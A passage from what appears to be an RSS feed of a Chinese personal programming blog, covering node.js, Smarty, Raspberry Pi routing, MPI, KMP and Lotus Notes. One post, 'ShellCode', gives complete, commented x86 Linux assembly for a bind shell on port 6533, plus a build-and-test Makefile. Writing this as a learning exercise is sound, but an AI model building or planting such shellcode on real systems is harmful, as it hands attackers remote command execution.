如果任务类型是3<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将t加入q3<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果q1,q2和q3三个队列的任务总数等于x+y，退出循环，否则读入下一任务。<br>如果q3不为空，将q3的任务分配到q1和q2中，使q1的任务个数是x，q2的任务个数是y<br>这是贪心法的思想，可以证明这种方案得到的是最优解。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201092481723463/</guid>
    </item>
    <item>
      <title>
<![CDATA[[译]node.js入门]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010113194358698/</link>
      <description>
<![CDATA[<b>简介：</b><br>Node的目标是<wbr>提供一个简单的构建网络程序的方法。在下面的"hello world"例子中，很多客户端连接可以被并行地处理。Node告诉操作系统(通过epoll, kqueue, /dev/poll, 或select)在新连接创建时通知它，然后它进入睡眠状态。如果有新的连接，它就会执行回调函数。每个连接仅仅是一个很小的堆申请。<br><br>Node的处理模型和现在常用的使用操作系统线程的并发模型不同。基于线程的网络相对效率低并且难以使用。与传统线程模型对每个新连接都要申请2M的线程堆栈相比，Node在高负载下表现出更好的内存效率。而且，Node用户不必关心进程死锁，因为Node里根本没有锁的概念。Node几乎没有直接执行IO操作的函数，进程也就永不阻塞，因为没有阻塞，即使不是专家也能编写快速的系统。<br>Node在设计上受Ruby的Event Machine和Python的Twisted影响并且和它们有些像。Node更注重事件模型，它将事件循环作为语言结构而不是类库。在其它的系统中，一般会有一个阻塞的调用来开始事件循环，在脚本的开始使用回调函数定义一个行为，然后在最后通过调用阻塞的调用(例如EventMachine::run())来启动服务。Node没有这样的启动事件循环的函数调用，它执行完输入脚本后自动进入事件循环，这有点像浏览器的JavaScript，事件循环对用户隐藏了。<br><br>译注：一句话，node.js 是一种事件驱动地编写并发网络程序的脚本语言，语法与JavaScript相似。<br><br><b>下载源代码：</b><br>$ wget http://nodejs.org/dist/node-v0.2.6.tar.gz<br><br><b>编译安装：</b><br>$ tar xf node-v0.2.6.tar.gz<br>$ cd node-v0.2.6<br>$ ./configure<br>$ make<br>$ sudo make install<br><br><b>示例：<br>1. hello.js<br></b>$ cat&gt; hello.js&lt;&lt;EOF<br>console.log("Hello, Node")<br>EOF<br>$ node hello.js<br>Hello, Node<br><b>2. httpserver.js</b><br>$ cat&gt; httpserver.js &lt;&lt;EOF<br>var http = require('http');<br>http.createServer(function (req, res) {<br>&nbsp; res.writeHead(200, {'Content-Type': 'text/plain'});<br>&nbsp; res.end('Hello World\n');<br>}).listen(8124, "127.0.0.1");<br>console.log('Server running at http://127.0.0.1:8124/');<br>EOF<br>hankjin@jnfdaj:~/node$ node httpserver.js &amp;<br>hankjin@jnfdaj:~/node$ wget http://127.0.0.1:8124/<br>hankjin@jnfdaj:~/node$ cat index.html<br>Hello World<br><b>3. tcpserver.js</b><br>hankjin@jnfdaj:~/node$ cat &gt; tcpserver.js &lt;&lt;EOF<span></span><span><br>var net = require('net');<br>net.createServer(function (socket) {<br>&nbsp; socket.write("Echo server\r\n");<br>&nbsp; socket.on("data", function (data) {<br>&nbsp;&nbsp;&nbsp; socket.write(data);<br>&nbsp; });<br>}).listen(8124, "127.0.0.1");<br>EOF<br></span>hankjin@jnfdaj:~/node$ node tcpserver.js &amp;<br>[1] 20031<br>hankjin@jnfdaj:~/node$ telnet 127.0.0.1 8124<br>Trying 127.0.0.1...<br>Connected to 127.0.0.1.<br>Escape character is '^]'.<br>Echo server<br>hello<br>hello<br>bye<br>bye]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010113194358698/</guid>
    </item>
    <item>
      <title>
<![CDATA[php模板Smarty源码一瞥]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200910591749241/</link>
      <description>
<![CDATA[SmartydIt is extremely fast，Smarty的网站上如是说。<br>非常极其快，为什么那么快呢？忽悠吗？<br>还好Smarty的源代码不多，直接去看源代码，<br><br>首先看Smarty.class.php，不停的按PageDown键，简直就是Smarty文档嘛，一直翻到1/2的时候，终于看到动真家伙的地方了，fetch，也是display的实现，预料之中，因为Smarty的使用也是一句display('xxx.tpl')调用开始工作的。<br>开始看fetch函数，一个将近200行的大函数<br>function fetch($resource_name, $cache_id = null, $compile_id = null, $display = false)<br>简单点说：第一步：加载库，第二步：编译，第三步：缓存，第四步：输出[如果需要]<br>所以，编译是关键，一切都隐藏在编译中。<br><br>打开Smarty_Compiler.class.php，这个就是传说中的Smarty编译器<br>首先是一大堆的正则表达式，然后是一堆函数，很熟悉的感觉了<br>先去templates_c下看看吧，编译好的模板文件%%12^129^1297CAF7%%i18n.tpl.php，打开看看就是标准的php文件了，项目开发完成以后，将compile_check选项关闭，全速运行，smarty就是一个代理的php文件<br>require xxxx.php<br>so，不由想到一个一句代码的python编辑器，就是这么简单<br>os.system("notepad "+" ".join(sys.argv))<br><br>所以说，smarty的秘密就是Smarty.class.php 的 fetch() 函数，以及Smarty_Compiler.class.php。<br>SmartydIt is extremely fast，不余欺也。<br>唯一不解的是Smarty_Compiler为什么用正则表达式，而不用编译器的标准配置有限状态机呢？<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200910591749241/</guid>
    </item>
    <item>
      <title>
<![CDATA[ShellCode]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720100202489789/</link>
      <description>
<![CDATA[Makefile:<br>binds: binds.o<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ld binds.o -o binds<br><br>binds.o: binds.s<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; as binds.s -o binds.o<br><br>test: binds<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./binds &amp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nc localhost 6533<br><br><br># bindshell.s --bindport on 6533<br>.section .text<br>.global _start<br>_start:<br>#清空各寄存器<br>xor %eax,%eax<br>xor %ebx,%ebx<br>xor %ecx,%ecx<br>#socketcall(int call, unsigned long *args)<br>#al-&gt;66 bl-&gt;call cx-&gt;args<br><br>#socket(2,1,0)创建一个TCP连接，注意字节序。<br>push %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第3个参数 0<br>push $0x1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第2个参数 1 SOCK_STREAM<br>push $0x2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第1个参数 2 AF_INET<br>mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将ECX里的数组地址作为socketcall系统调用的第2个参数<br>inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl＝0＋1,作为socketcall的第一个参数，调用socket函数<br>movb $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #调用socketcall,0x66=102<br>int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br>mov %eax,%esi&nbsp;&nbsp;&nbsp;&nbsp; #将返回句柄保存在ESI中<br><br>#bind(int sockfd, const struct sockaddr* addr, socklen_t addrlen)<br>push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #EDX压栈作为结束符<br>push $0x8519FF02&nbsp;&nbsp;&nbsp;&nbsp; #0x8519=6533,sin.family=02,FF任意字节填充<br>mov %esp,%ecx&nbsp;&nbsp;&nbsp; #将ESP地址赋值给ECX<br>push $0x10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #开始bind的参数，0x10压栈 addrlen<br>push %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #保存地址 sockaddr*<br>push %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #把前面的句柄压栈 sockfd<br>mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #继续把数组地址作为socketcall调用的第2个参数<br>inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl=1+1=2=SYS_BIND<br>mov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #调用socketcall<br>int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br><br>#listen(int sockfd, int backlog)<br>push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #EDX压栈，作为结束符 backlog<br>push %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #句柄压栈，作为listen的参数 sockfd<br>mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将数组地址设为socketcall的第2个参数<br>mov $0x4,%bl&nbsp;&nbsp;&nbsp;&nbsp; #bl=4=SYS_LISTEN<br>mov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #执行socketcall系统调用<br>int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br><br>#accept(int sockfd, struct sockaddr* addr, socklen_t len)<br>push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #参数0 len<br>push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #参数0 addr<br>push %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #句柄压栈 sockfd<br>mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将数组设为系统调用第2个参数<br>inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl=4+1=SYS_ACCEPT&nbsp;&nbsp; &nbsp;<br>mov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #执行系统调用<br>int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br><br>#dup2(int oldfd, int newfd)<br>mov %eax,%ebx&nbsp;&nbsp;&nbsp;&nbsp; #将accept返回的句柄复制到EBX sockfd<br>xor %ecx,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #清空 newfd-stdin<br>mov $0x3f,%al&nbsp;&nbsp;&nbsp;&nbsp; #dup2系统调用，0x3f=63<br>int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br>inc %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #1stdout<br>mov $0x3f,%al<br>int $0x80<br>inc %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #2stderr<br>mov $0x3f,%al<br>int $0x80<br><br>#之前熟悉的execve调用，打开一个新的shell<br>#execve(char* fname, char* argv[], char *envp[])<br>push %edx<br>push $0x68732f2f<br>push $0x6e69622f<br>mov %esp,%ebx&nbsp;&nbsp; &nbsp;#fname<br>push %edx<br>push %ebx<br>mov %esp,%ecx&nbsp;&nbsp; &nbsp;#argv[0]=fname<br>mov $0xb,%al&nbsp;&nbsp; &nbsp;#11 execve<br>int $0x80 <br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720100202489789/</guid>
    </item>
    <item>
      <title>
<![CDATA[MyEclipse内存不足PermGen space]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200931211332822/</link>
      <description>
<![CDATA[&nbsp;&nbsp;&nbsp; 很郁闷的错误, 在自己512M内存的笔记本上运行MyEclipse, 听着声音都心疼, 而且鼠标操作稍快MyEclipse就停止响应, 用的那叫个心惊胆战, 打字速度都不敢往上提, 真憋屈.<br>&nbsp;&nbsp;&nbsp; 有人讲同样运行效果的笔记本和台式机, 笔记本的配置至少要比台式机高一倍. 诚哉斯言, 1G内存的台式机相当于我笔记本的4倍配置, 在1G内存的台式机上运行MyEclipse, 流畅了好多, 还可以同时运行Firefox, 可是, 两个小时后, PermGen space错误竟然出现了, 罪魁祸首应该是MyEclipse或Hibernate之一. 据说启动Eclipse时加-Xmax之类的参数效果会好一些, referenceing...<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200931211332822/</guid>
    </item>
    <item>
      <title>
<![CDATA[用树莓派做无线路由器共享拨号上网]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372013102455232903/</link>
      <description>
<![CDATA[1. 准备工作<div>1.1 硬件准备</div><div>树莓派：</div><div>HDMI转VGA接口：</div><div>USB键盘</div><div>液晶显示器</div><div>无线网卡：EP-8508GS</div><div>电脑（开发机，带Wifi）：Win7</div><div>读卡器：</div><div>拨号上网帐户与网线：</div><div>1.2 软件准备</div><div>写镜像工具 http://jaist.dl.sourceforge.net/project/win32diskimager/Archive/win32diskimager-v0.9-binary.zip</div><div>Xbian镜像&nbsp;<span style="line-height: 28px;"   >http://jaist.dl.sourceforge.net/project/xbian/release/XBian_1.0_Beta_2.7z</span></div><div>Wifi共享专家<a style="line-height: 28px;" rel="nofollow" href="http://www.onlinedown.net/soft/259534.htm"   >http://www.onlinedown.net/soft/259534.htm</a></div><div>1.3 准备环境</div><div>第一步：解压缩Xbian镜像，使用镜像工具写入SD卡</div><div><div><img title="用树莓派做无线路由器共享拨号上网 - hankjin - 云水居"   alt="用树莓派做无线路由器共享拨号上网 - hankjin - 云水居"   style="margin:0 10px 0 0;"   src="http://img0.ph.126.net/R8gPyu-jqnOBshx1oeDhDw==/140456013478824492.png"   ></div>&nbsp;<span style="line-height: 28px;"   >第二步：使用Wifi共享专家，共享电脑的拨号，生成AP</span></div><div><div><img title="用树莓派做无线路由器共享拨号上网 - hankjin - 云水居"   alt="用树莓派做无线路由器共享拨号上网 - hankjin - 云水居"   style="margin:0 10px 0 0;"   src="http://img1.ph.126.net/EPfaJznYHUl3eXw5mvonCg==/2227030015834895302.png"   ></div>&nbsp;<span style="line-height: 28px;"   >第三步：连接树莓派，开机</span></div><div>插入第一步的SD卡，HDMI转VGA连接树莓和显示器，插入无线网卡和USB键盘，电源线连接电源</div><div>第四步：配置树莓派网络</div><div>启动XBMC成功后，按键盘的下方向键，选择左下脚第二个图标，按回车，出现菜单，选第一个Exit</div><div><span style="line-height: 28px;"   >进入Xbian配置界面：Settings-&gt;Network-&gt;wlan0-&gt;DHCP-&gt;Scan，选中第二步共享的AP，连接成功后，按Ctrl+C退出。</span></div><div>使用sudo apt-get update，确认网络连接成功</div><div>第五步：设置HDMI输出</div><div>Xbian重启后很容易黑屏，需要设置强制HDMI</div><div>sudo xbian-config</div><div>Settings-&gt;System-&gt;Video Output-&gt;Force HDMI</div><div><br></div><div><wbr><div>2. 制作路由器</div><div>2.1 路由软件hostapd，xbian的官方源里有hostapd，但是不支持我的无线网卡驱动，所以要用第三方的hostapd版本，无线网卡的版本查看方法(sudo lsusb)</div><div>输出示例：Bus 001 Device 004: ID 0bda:8176 Realtek Semiconductor Corp. RTL8188CUS 802.11n WLAN Adapter</div><div>安装步骤：</div><div>wget https://codeload.github.com/jenssegers/RTL8188-hostapd/tar.gz/v1.1</div><div>tar v1.1</div><div>cd RTL8188-hostapd-1.1/hostapd</div><div>sudo make</div><div>sudo make install</div><div>sudo vi /etc/hostapd/hostapd.conf</div><div><div># Basic configuration</div><div>interface=wlan0</div><div>ssid=Hank_Wifi</div><div>channel=11</div><div><br></div><div># WPA and WPA2 configuration</div><div>macaddr_acl=0</div><div>auth_algs=3</div><div>ignore_broadcast_ssid=0</div><div>wpa=2</div><div>wpa_passphrase=hankjinPassword</div><div>wpa_key_mgmt=WPA-PSK</div><div>wpa_pairwise=TKIP</div><div>rsn_pairwise=CCMP</div><div><br></div><div># Hardware configuration</div><div>driver=rtl871xdrv</div><div>ieee80211n=1</div><div>hw_mode=g</div><div>device_name=RTL8188CUS</div><div>manufacturer=Realtek</div></div><div>sudo /etc/init.d/hostapd restart</div><div><br></div><div>2.2 DHCP&amp;DNS软件</div><div>网上很多人用isc-dhcp-server，这里用的是dnsmasq，安装方法很简单，配置更简单：</div><div>sudo apt-get install dnsmasq</div><div>sudo vi /etc/dnsmasq.conf</div><div>#无线网卡</div><div>interface=wlan0</div><div>#分配的IP段</div><div>dhcp-range=192.168.1,50,192.168.1.150,12h</div><div>#网关</div><div>dhcp-option=3,192.168.1.1</div><div>#DNS</div><div>dhcp-option=6,8.8.8.8</div><div>sudo /etc/init.d/dnsmasq restart</div><div><p style="margin:0in;font-size:10.0pt;"   lang="en-US"   ><span style="line-height: 28px; font-size: 16px;"   >3. 拨号上网</span></p><p style="margin:0in;font-size:10.0pt;"   lang="en-US"   ><span style="line-height: 28px; font-size: 16px;"   >sudo apt-get install pppoeconf</span></p><p style="margin:0in;font-size:10.0pt;"   lang="en-US"   ><span style="line-height: 28px; font-size: 16px;"   >sudo pppoeconf</span></p><p style="margin: 0in;"   lang="en-US"   >输入用户名和密码，其它全部默认即可。</p><p style="margin: 0in;"   lang="en-US"   >如果连接不上，可以尝试修改/etc/ppp/options，将lcp-echo-failure的值改为40</p></div><div>4. 设置转发</div></div><div>sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0</div><div>sudo sh -c "echo 1 &gt; /proc/sys/net/ipv4/ip_forward"</div><div>sudo iptables -t nat -A POSTROUTING -o ppp1 -j MASQUERADE</div><div><br></div><div>5. 享受成果</div><div>从笔记本上找到HankWiFi，输入密码即可</div><div><br></div><div>6. 全自动</div><div>6.1 将dnsmasq和hostapd服务设置自动启动</div><div>sudo xbian-config</div><div>Services</div><div>6.2 设置静态IP</div><div>sudo vi /etc/network/interface，将wlan0相关的部分改为</div><div><div>allow-hotplug wlan0</div><div>iface wlan0 inet static</div><div>address 192.168.1.1</div><div>netmask 255.255.255.0</div></div><div>6.3 设置转发</div><div>sudo vi /etc/rc.local</div><div><div>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</div><div>iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</div><div><span style="line-height: 28px;"   >iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT &nbsp; &nbsp;</span></div><div>iptables -t nat -A POSTROUTING -o ppp1 -j MASQUERADE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div><div>exit 0</div></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372013102455232903/</guid>
    </item>
    <item>
      <title>
<![CDATA[在struts中使用&lt;html:select&gt;]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720093121414573/</link>
      <description>
<![CDATA[主要用到html:optionsCollection标签和LabelValueBean类, 也就是两块: Action中populate值, jsp中用Tag显示<br>1.Tag<br>&lt;html:select property="productId"&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;html:optionsCollection name="productList"/&gt;<br>&lt;/html:select&gt;<br><br>2.Action<br>HashSet&lt;LabelValueBean&gt; hs = new HashSet&lt;LabelValueBean&gt;();<br>ProductDAO dao = new ProductDAO();<br>List&lt;Product&gt; products = dao.findAll();<br>for(Product product:products){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; hs.add(new LabelValueBean(product.getName(), product.getId()));<br>}<br>request.setAttribute("productList", hs);<br><br>3. 不需要Action, 直接使用html:option写死<br>&lt;html:select property="type"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;html:option value="F"&gt;产品&lt;/html:option&gt;<br>&nbsp;&nbsp;&nbsp; &lt;html:option value="S"&gt;步骤&lt;/html:option&gt;<br>&nbsp;&nbsp;&nbsp; &lt;html:option value="P"&gt;配件&lt;/html:option&gt;<br>&lt;/html:select&gt;<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720093121414573/</guid>
    </item>
    <item>
      <title>
<![CDATA[REBOL - VID]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084122146546/</link>
      <description>
<![CDATA[&gt;&gt; a: layout[button "B" [view b]<br>[&nbsp;&nbsp;&nbsp; button "C" [view c]<br>[&nbsp;&nbsp;&nbsp; ]<br>&gt;&gt; b: layout[button "A"[view a]<br>[&nbsp;&nbsp;&nbsp; button "C" [view c]<br>[&nbsp;&nbsp;&nbsp; ]<br>&gt;&gt; c: layout[button "A"[view a]<br>[&nbsp;&nbsp;&nbsp; button "B"[view b]<br>[&nbsp;&nbsp;&nbsp; ]<br>&gt;&gt; view a]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084122146546/</guid>
    </item>
    <item>
      <title>
<![CDATA[在mbuntu上使用MPI]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201081752016767/</link>
      <description>
<![CDATA[MPI在ubuntu10.04版本上的包名称为libmpich2-dev<br>sudo apt-get install libmpich2-dev<br>单节点<br>touch .mpd.conf<br>chmod 600 .mpd.conf<br>mpdboot<br>mpicc test.c -o test<br>mpirun -n 3 ./test<br>多节点<br>节点1:node1<br>cd .ssh<br>ssh-keygen -t rsa<br>scp id_rsa.pub hankjin@node2:/home/hankjin/.ssh/authorized_keys<br>cd ..<br>节点2: node2<br>touch .mpd.conf<br>chmod 600 .mpd.conf<br>cd .ssh<br>ssh-keygen -t rsa<br>scp id_rsa.pub hankjin@node1:/home/hankjin/.ssh/authorized_keys<br>cd ..<br>启动并测试mpd(节点1)上<br>cat&gt; mpd.hosts&lt;&lt;EOF<br>node1<br>node2<br>EOF<br>scp test hankjin@node2:/home/hankjin<br>mpdboot -n 2 -f mpd.hosts<br>mpdtrace<br>运行程序<br>mpirun -n 3 -host node1 ./test : -n 4 -host node2 ./test<br>[1/7] on node1<br>[0/7] on node1<br>[3/7] on node2<br>[4/7] on node2<br>[2/7] on node1<br>[6/7] on node2<br>[5/7] on node2<br>退出mpi<br>mpdallexit<br><br>测试程序：<br>#include &lt;mpi.h&gt;<br>#include &lt;stdio.h&gt;<br><br>char name[20];<br>int main(int argc, char*argv[]){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int x,n,nameLen;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Init(&amp;argc, &amp;argv);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Comm_rank(MPI_COMM_WORLD,&amp;x);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Comm_size(MPI_COMM_WORLD,&amp;n);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Get_processor_name(name, &amp;nameLen);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("[%d/%d] on %s\n", x,n, name);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Finalize();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>}<br>常见问题：<br>ssh没有自动连通]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201081752016767/</guid>
    </item>
    <item>
      <title>
<![CDATA[显示器屏幕闪烁]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200931092613845/</link>
      <description>
<![CDATA[42寸电视显示器, 连接主机, 屏幕不断闪烁. 第一次换了一个主机, 问题解决了, 怀疑是信号干扰的缘故.<br>第二次又出现了同样的问题, 换主机不能用, 换笔记本正常. 继续不解中, 然后找来一个插线板, 把主机和显示器的电源都接到同一个插线板上, 问题解决.<br>结论: 显示器和主机的工作电源不一致(不同的插座的电源不同), 换同一个插线板后, 工作电源一致.<br><br>结论: 排除所有的出错可能.<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200931092613845/</guid>
    </item>
    <item>
      <title>
<![CDATA[KMP模板]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720108910244432/</link>
      <description>
<![CDATA[void preKmp(char *src, int m, int *rule){<br>&nbsp; int i=0,j=-1;<br>&nbsp; rule[0]=j;<br>&nbsp; while(i&lt;m){<br>&nbsp;&nbsp;&nbsp; while(j!=-1 &amp;&amp; src[j] != src[i])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j=rule[j];<br>&nbsp;&nbsp;&nbsp; i++,j++;<br>&nbsp;&nbsp;&nbsp; if(j&gt;=m)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rule[i]=rule[j-1];<br>&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rule[i]=j;<br>&nbsp; }<br>}<br>void kmp(char *src, int m, char *dest, int n){<br>&nbsp; int rule[MAXN];<br>&nbsp; preKmp(src,m,rule);<br>&nbsp; int i=0, j=0;<br>&nbsp; while(i&lt;n){<br>&nbsp;&nbsp;&nbsp; while(j!=-1 &amp;&amp; src[j] != dest[i]){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j = rule[j];<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; i++,j++;<br>&nbsp;&nbsp;&nbsp; if(j==m){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //print ans<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j=rule[j];<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp; }<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720108910244432/</guid>
    </item>
    <item>
      <title>
<![CDATA[把Lotus Notes的nsf数据库文档转换成xml文件]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720085321439261/</link>
      <description>
<![CDATA[<P>需要设置的属性有</P>
<P>1：数据库文件的名字（放在Notes的默认数据库目录下，如C:\notes\data）</P>
<P>2：要转换的View（邮件的收件箱和发件箱分别为$Inbox和$Sent）</P>
<P>3：转换生成的xml文件存放路径（以\\结束，如D:\\data\\）</P>
<P>注：Lotus Notes7下测试通过</P>
<P>package hjz;</P>
<P>import java.io.File;<BR>import java.util.List;<BR>import java.util.Vector;</P>
<P>import lotus.domino.Database;<BR>import lotus.domino.Document;<BR>import lotus.domino.DxlExporter;<BR>import lotus.domino.Item;<BR>import lotus.domino.NotesFactory;<BR>import lotus.domino.NotesThread;<BR>import lotus.domino.Session;<BR>import lotus.domino.Stream;<BR>import lotus.domino.View;<BR>/**<BR>&nbsp;* Convert Notes DB to xml<BR>&nbsp;* @author hankjin<BR>&nbsp;* this method can convert notes db to xml files<BR>&nbsp;*/<BR>public class Notes2Xml {<BR>&nbsp;public static final int TYPE_VIEWNAME = 1;<BR>&nbsp;public static final int TYPE_VIEWINDEX = 2;<BR>&nbsp;//Notes related variable<BR>&nbsp;Session s;<BR>&nbsp;Database db;<BR>&nbsp;View inbox;<BR>&nbsp;DxlExporter dxl;<BR>&nbsp;<BR>&nbsp;//special variable<BR>&nbsp;String dbName;<BR>&nbsp;String xmlPath;<BR>&nbsp;String viewName;<BR>&nbsp;int viewIndex;<BR>&nbsp;int viewType;<BR>&nbsp;<BR>&nbsp;public Notes2Xml(){<BR>&nbsp;&nbsp;<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp; * @param args<BR>&nbsp; */<BR>&nbsp;public static void main(String[] args) throws Exception{<BR>&nbsp;&nbsp;// TODO Auto-generated method stub<BR>&nbsp;&nbsp;Notes2Xml tool = new Notes2Xml();<BR>&nbsp;&nbsp;tool.setDbName("hjz_test.nsf");<BR>&nbsp;&nbsp;tool.setXmlPath("D:\\data\\");<BR>&nbsp;&nbsp;tool.setViewType(Notes2Xml.TYPE_VIEWINDEX);<BR>&nbsp;&nbsp;tool.setViewIndex(0);<BR>&nbsp;&nbsp;tool.view2Xml();<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp; * Convert a view 2 xml<BR>&nbsp; * @throws 